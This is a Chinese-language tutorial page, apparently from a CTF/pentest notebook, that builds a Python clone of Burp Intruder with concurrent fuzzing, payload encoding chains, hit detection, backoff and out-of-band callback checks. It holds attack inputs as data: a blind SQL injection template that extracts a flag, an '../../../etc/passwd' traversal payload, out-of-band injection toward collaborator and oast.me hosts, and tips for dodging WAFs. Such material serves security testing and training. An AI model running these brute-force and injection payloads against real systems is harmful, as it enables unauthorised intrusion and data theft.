---

phase: webapp
vuln_class: [tooling, fuzzing]
title: Python 请求工具集（requests / httpx 并发爆破）
summary: 用 Python 复刻 Burp Intruder 的最小可用骨架：基线 → 并发 → 处理链 → 命中判定。判据是「先跑通一条，再放大」。
---

# Python 请求工具集（requests / httpx 并发爆破）

Payload 来源与字典组织见 [[web/行业视野/pat-reference.md|pat-reference]]；命中后的深入利用回到各漏洞专项篇，如 [[web/漏洞分类/SQL注入/|SQL 注入]]、[[web/漏洞分类/XSS/|XSS]]、[[web/漏洞分类/路径穿越/|路径穿越]]。

## 0. 判据速查

| 需求 | 用什么 | 去哪节 |
|---|---|---|
| 手工改包、逐条看差异 | Burp Repeater | 不在本篇 |
| 批量替换一个位置 | `sniper` 或 `intruder_sync` | §3 |
| 多位置同值 / 多字典组合 | `battering_ram` / `pitchfork` / `cluster_bomb` | §4 |
| 字典大到装不进内存 | `wordlist_stream` + 分批提交 | §5 |
| Payload 要先编码/加前后缀 | `process_payload` | §6 |
| 判断哪条命中 | `grep_*` 三件套 | §7 |
| 打 WAF、被 429 | 限速 + `Retry-After` + UA 轮换 | §8 |
| 需要 OOB 确认 | Collaborator / interactsh | §9 |
| 完整串起来 | `put_together` | §10 |

**铁律：没有干净基线的爆破都是浪费。** 先手动 `sess.get` 一次，记下正常响应的状态码、长度、关键词，再去放大。

## 1. Session 骨架

```python
import requests, urllib.parse

sess = requests.Session()
sess.headers.update({"User-Agent": "Mozilla/5.0"})
# 走 Burp 看包
sess.proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
# sess.verify = False        # 仅自签名证书的靶场

TIMEOUT = (5, 10)            # (connect, read)

def get(url, **kw):
    kw.setdefault("timeout", TIMEOUT)
    return sess.get(url, **kw)
```

要点：

- **`requests.Session` 不是线程安全的**。多线程时每个 worker 自己建一个，别共享。
- `timeout` 一定用元组。只给一个数时连接超时和读超时相同，DNS 卡住会等满整个时长。
- Cookie 和 `Authorization` 挂在 `sess` 上，后续所有请求自动带，不用每条拼。

## 2. 四种攻击类型

| 类型 | 语义 | Burp 对应 | 用途 |
|---|---|---|---|
| sniper | 一次只动一个位置，其余用 base | Sniper | 单参数探测 |
| battering_ram | 所有位置填同一个值 | Battering ram | 同一 token 出现在多处 |
| pitchfork | 多字典并行推进（zip） | Pitchfork | 用户名密码一一对应 |
| cluster_bomb | 多字典笛卡尔积 | Cluster bomb | 全组合，量爆炸 |

```python
import itertools, urllib.parse

def render(template, positions, values):
    out = template
    for pos, val in zip(positions, values):
        out = out.replace(pos, urllib.parse.quote(str(val), safe=""))
    return out

def sniper(template, positions, payloads):
    for pos in positions:
        for p in payloads:
            vals = [p if positions[i] == pos else "base" for i in range(len(positions))]
            yield render(template, positions, vals)

def battering_ram(template, positions, payloads):
    for p in payloads:
        yield render(template, positions, [p] * len(positions))

def pitchfork(template, positions, *sets):
    for combo in zip(*sets):
        yield render(template, positions, combo)

def cluster_bomb(template, positions, *sets, cap=50000):
    for combo in itertools.islice(itertools.product(*sets), cap):
        yield render(template, positions, combo)
```

**`cap` 不是可选项**。`cluster_bomb` 的规模是各字典长度的乘积，三个 1000 行的字典就是 10 亿请求。永远给上限。

## 3. 单线程基线（先跑通）

```python
def intruder_sync(url_template, payloads, grep_hit="flag{"):
    sess = requests.Session()
    sess.headers.update({"User-Agent": "Mozilla/5.0"})

    # 基线：拿正常响应的特征
    base = sess.get("https://example.com/profile", timeout=TIMEOUT)
    print(f"baseline: {base.status_code} len={len(base.text)}")

    for p in payloads:
        url = url_template.replace("FUZZ", urllib.parse.quote(str(p), safe=""))
        try:
            r = sess.get(url, timeout=TIMEOUT)
        except requests.RequestException as e:
            print(f"{url} ERR {e}")
            continue
        hit = (grep_hit in r.text) or (r.status_code not in (200, 404))
        print(f"{r.status_code} {len(r.text):6d} {'HIT ' if hit else '    '} {url}")
        if hit:
            return url, r
    return None
```

单线程的价值不是速度，是**验证命中判定逻辑本身对不对**。判定写错，并发再快也只是更快地拿到错误结论。

## 4. 并发：ThreadPoolExecutor

```python
from concurrent.futures import ThreadPoolExecutor, as_completed

def intruder_threaded(url_template, payload_iter, threads=30, grep_hit="flag{"):
    def worker(url):
        s = requests.Session()                 # 每线程一个 Session
        s.headers.update({"User-Agent": "Mozilla/5.0"})
        try:
            r = s.get(url, timeout=TIMEOUT)
            hit = (grep_hit in r.text) or (r.status_code not in (200, 404))
            return url, r.status_code, len(r.text), hit, r.text[:400]
        except requests.RequestException:
            return url, None, 0, False, ""

    urls = [url_template.replace("FUZZ", urllib.parse.quote(str(p), safe="")) for p in payload_iter]
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs = {ex.submit(worker, u): u for u in urls}
        for fut in as_completed(futs):
            url, code, n, hit, snippet = fut.result()
            print(f"{code} {n:6d} {'HIT ' if hit else '    '} {url}")
            if hit:
                for pending in futs:
                    pending.cancel()
                return url
    return None
```

要点：

- **`as_completed` 而不是 `map`**：`map` 按提交顺序返回，前面一条卡住就全部阻塞，看不出「谁先命中」。
- 命中后 `cancel()` 只对**还没启动**的 future 有效，已在跑的会跑完。想立刻停，worker 里加一个共享的 `threading.Event`。
- `r.text[:400]` 保留片段，避免把整个响应塞进内存。字典大时这个细节决定会不会 OOM。

## 5. 大字典：流式生成

```python
from pathlib import Path

def wordlist_stream(path):
    with open(path, encoding="utf-8", errors="ignore") as f:
        for line in f:
            s = line.strip()
            if s and not s.startswith("#"):
                yield s

def discovery_feed(base_with_FUZZ, words_path, exts=("", ".php", ".bak", ".txt", ".zip")):
    for w in wordlist_stream(words_path):
        for e in exts:
            yield base_with_FUZZ.replace("FUZZ", f"{w}{e}")

def blind_sqli_char_feed(url_template, charset=None,
                         tmpl="' OR ASCII(SUBSTR((SELECT flag FROM flag),{i},1))={c}-- -"):
    import string
    if charset is None:
        charset = string.ascii_letters + string.digits + "{}_-"
    i = 1
    while True:
        for ch in charset:
            payload = tmpl.format(i=i, c=ord(ch))
            yield url_template.replace("FUZZ", urllib.parse.quote(payload, safe=""))
        i += 1
```

分批消费，边生成边打：

```python
def intruder_from_feed(url_template, feed_gen, threads=30, batch_mult=2):
    def worker(u):
        s = requests.Session()
        try:
            r = s.get(u, timeout=TIMEOUT)
            return u, ("flag{" in r.text or r.status_code not in (200, 404))
        except requests.RequestException:
            return u, False

    it = iter(feed_gen)
    while True:
        batch = list(itertools.islice(it, threads * batch_mult))
        if not batch:
            break
        with ThreadPoolExecutor(max_workers=threads) as ex:
            for f in as_completed({ex.submit(worker, u): u for u in batch}):
                u, hit = f.result()
                if hit:
                    return u
    return None
```

`blind_sqli_char_feed` 的 `charset` 顺序影响效率：把 `{`、`}`、`_`、数字放前面，flag 格式通常是 `flag{...}`，能早停。

## 6. Payload 处理链

一条 payload 进，多条变换规则依次作用。**顺序即语义**，`("prefix","'")` 在 `("encode","url")` 之前和之后结果完全不同。

```python
import base64, hashlib, html, re, urllib.parse

def process_payload(p, rules):
    cur, raw = p, p
    for kind, *args in rules:
        if kind == "prefix":
            cur = args[0] + cur
        elif kind == "suffix":
            cur = cur + args[0]
        elif kind == "replace":
            cur = re.sub(args[0], args[1], cur)
        elif kind == "substring":
            off, n = args
            cur = cur[off:off + n]
        elif kind == "reverse_substring":
            end, n = args
            cur = cur[len(cur) - end - n: len(cur) - end] if end else cur[len(cur) - n:]
        elif kind == "case":
            cur = {"upper": str.upper, "lower": str.lower, "title": str.title}[args[0]](cur)
        elif kind == "encode":
            cur = {"url":  lambda x: urllib.parse.quote(x, safe=""),
                   "html": html.escape,
                   "base64": lambda x: base64.b64encode(x.encode()).decode(),
                   "hex": lambda x: x.encode().hex()}[args[0]](cur)
        elif kind == "decode":
            cur = {"url": urllib.parse.unquote,
                   "base64": lambda x: base64.b64decode(x).decode(errors="ignore")}[args[0]](cur)
        elif kind == "hash":
            cur = {"md5": lambda x: hashlib.md5(x.encode()).hexdigest(),
                   "sha1": lambda x: hashlib.sha1(x.encode()).hexdigest(),
                   "sha256": lambda x: hashlib.sha256(x.encode()).hexdigest()}[args[0]](cur)
        elif kind == "raw":                       # 把原始值拼回（绕二次编码校验）
            cur = (raw + cur) if args[0] == "append" else (cur + raw)
        elif kind == "skip":                      # 命中即丢弃，提前剪枝
            if re.search(args[0], cur):
                return None
        elif kind == "base":
            cur = cur.replace("{base}", args[0])
        elif kind == "collab":
            cur = re.sub(args[0], args[1], cur)
        elif kind == "final_urlencode":
            cur = urllib.parse.quote(cur, safe="")
    return cur
```

常用组合：

```python
process_payload("admin", [("prefix", "'"), ("encode", "base64"), ("encode", "url")])
process_payload("admin", [("hash", "md5"), ("final_urlencode", "")])
process_payload("../../../etc/passwd", [("replace", r"\.\./", ""), ("encode", "url")])
process_payload("{base}FUZZ", [("base", "https://example.com"), ("collab", r"FUZZ", "abc123.oast.me")])
```

**`skip` 是最有价值的一条**：把必然被 WAF 拦的 payload（含 `union select`、含 `<script`）在发出去之前丢掉，能省掉大量 403 和封 IP。

## 7. 命中判定

```python
def grep_match(text, patterns, is_regex=False, case=False):
    flags = 0 if case else re.I
    hits = {}
    for pat in patterns:
        if is_regex:
            hits[pat] = len(re.findall(pat, text, flags))
        else:
            hits[pat] = (text if case else text.lower()).count(pat if case else pat.lower())
    return hits

def grep_extract(text, regex, max_len=500):
    m = re.search(regex, text, re.S)
    if not m:
        return ""
    return (m.group(1)[:max_len] if m.lastindex else m.group(0)[:max_len])

def grep_payload_reflected(text, payload, case=True):
    return (text if case else text.lower()).count(payload if case else payload.lower())
```

**判定优先级**（从强到弱）：

1. **内容命中** —— `flag{`、`root:`、`SQL syntax`、`uid=0(`。最可靠。
2. **长度差异** —— 同一模板下长度显著偏离基线。次可靠，但要求基线稳定。
3. **状态码异常** —— `not in (200, 404)`。噪声最大：500 可能是真命中，也可能是 payload 语法错误。
4. **时间差异** —— 时间盲注专用，需要先测基线抖动。

反面判据：**长度和状态码都没变，但响应时间翻倍** —— 先怀疑是网络抖动，重测三次再下结论。

## 8. 限速与退避

```python
import random, time

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
]

def fetch_with_backoff(sess, url, retries=3, pause_ms=300, backoff_codes=(429, 503)):
    backoff = pause_ms / 1000
    for attempt in range(retries + 1):
        try:
            sess.headers["User-Agent"] = random.choice(USER_AGENTS)
            r = sess.get(url, timeout=TIMEOUT)
            if r.status_code in backoff_codes:
                ra = r.headers.get("Retry-After", "")
                if ra.isdigit():
                    time.sleep(int(ra))       # 服务端明确说了等多久，照做
                else:
                    time.sleep(backoff)
                    backoff *= 2              # 没给就指数退避
                continue
            return r
        except requests.RequestException:
            if attempt >= retries:
                return None
            time.sleep(pause_ms / 1000 + random.uniform(0, 0.2))
    return None
```

参数经验值：

| 场景 | 并发 | 延迟 | 抖动 |
|---|---|---|---|
| 本地靶场 | 30 | 0 | 0 |
| 内网目标 | 10–20 | 0–50ms | 0 |
| 公网 + WAF | 5–10 | 100–300ms | 50ms |
| 有明确 429 | 2–3 | 按 `Retry-After` | 200ms |

**`Retry-After` 优先于指数退避**。服务端已经告诉你等多久，自己算的指数退避通常不是等太久就是等太短。

## 9. OOB 确认

```python
import uuid

def collaborator_payload(domain="burpcollaborator.net"):
    return f"{uuid.uuid4().hex}.{domain}"

def collaborator_inject(url_template, domain="burpcollaborator.net"):
    sub = collaborator_payload(domain)
    return url_template.replace("FUZZ", urllib.parse.quote(f"http://{sub}/", safe=""))

def poll_collaborator(poll_url):
    try:
        r = requests.get(poll_url, timeout=TIMEOUT)
        return r.json() if r.headers.get("content-type", "").startswith("application/json") else r.text
    except Exception:
        return []

def interactsh_fallback_poll(interact_url):
    try:
        return requests.get(interact_url, timeout=TIMEOUT).text
    except Exception:
        return ""
```

要点：

- **每次注入用新的子域名**。复用同一个 UUID 时，多条 payload 的回显分不清是谁触发的。
- 轮询间隔 ≥ 30s。DNS 和 HTTP 回连的延迟不一样，等 60s 再判定「没回显」。
- 无外网出口时用 interactsh 自建服务端，或退回 [[web/漏洞分类/DNS外带/|DNS 外带]] 里的方案。

## 10. 完整串联

```python
def put_together(url_template, wordlist_path, grep_pat="flag{", threads=10):
    def worker(u):
        s = requests.Session()
        s.proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
        try:
            r = s.get(u, timeout=TIMEOUT, allow_redirects=True)
            return u, (grep_pat in r.text) or r.status_code not in (200, 404)
        except requests.RequestException:
            return u, False

    rules = [("prefix", ""), ("final_urlencode", "")]
    urls = []
    for p in wordlist_stream(wordlist_path):
        cur = process_payload(p, rules)
        if cur is None:
            continue
        urls.append(url_template.replace("FUZZ", urllib.parse.quote(cur, safe="")))

    with ThreadPoolExecutor(max_workers=threads) as ex:
        for f in as_completed({ex.submit(worker, u): u for u in urls}):
            u, hit = f.result()
            print(f"{'HIT ' if hit else 'miss'} {u}")
            if hit:
                return u
    return None
```

## 11. 纪律

- **先基线，再放大**。没有正常响应的状态码/长度/关键词做参照，命中判定就是瞎猜。
- **`Session` 每线程一个**。共享 `Session` 在多线程下会串 cookie、串连接状态。
- **永远给 `cluster_bomb` 设上限**。乘积爆炸是唯一能让脚本跑到天荒地老的错误。
- **`process_payload` 的规则顺序就是语义**。想清楚「先加引号再 URL 编码」还是「先编码再加引号」，写反了就是全错。
- **命中判定宁严勿宽**。`status not in (200,404)` 会把所有 500 都当命中，最后人工筛几百条。
- **`Retry-After` 比指数退避准**。服务端说了等多久就等多久，别自作聪明。
- **OOB 每次换子域名**，否则回显无法归因。
- **走 Burp 代理时关掉 `verify` 只在靶场**，公网目标保持证书校验，否则中间人篡改会让你误判。
